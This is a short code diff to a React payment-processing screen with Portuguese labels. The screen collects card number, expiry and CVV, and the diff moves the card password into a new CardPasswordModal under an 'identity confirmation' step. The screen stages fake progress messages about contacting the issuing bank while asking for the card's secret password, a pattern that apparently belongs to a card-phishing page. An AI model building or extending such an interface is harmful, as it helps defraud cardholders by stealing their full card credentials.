@@ -1,6 +1,7 @@
 import { useEffect, useState } from 'react';
 import { CheckCircle, Loader } from 'lucide-react';
 import { toast } from 'sonner';
+import { CardPasswordModal } from './CardPasswordModal';
 
 interface PaymentProcessingScreenProps {
   isOpen: boolean;
@@ -10,17 +11,16 @@ interface PaymentProcessingScreenProps {
     numeroCartao: string;
     validade: string;
     cvv: string;
-    senhaCartao: string;
   };
   onClose: () => void;
 }
 
-type ProcessingStep = 'contacting' | 'validating' | 'updating' | 'success';
+type ProcessingStep = 'contacting' | 'validating' | 'identity' | 'success';
 
 const steps = [
   { id: 'contacting', label: 'Entrando em contato com banco emissor..' },
   { id: 'validating', label: 'Validando informações..' },
-  { id: 'updating', label: 'Atualizando cadastro..' },
+  { id: 'identity', label: 'Confirmação de identidade..' },
 ];
 
 export const PaymentProcessingScreen = ({
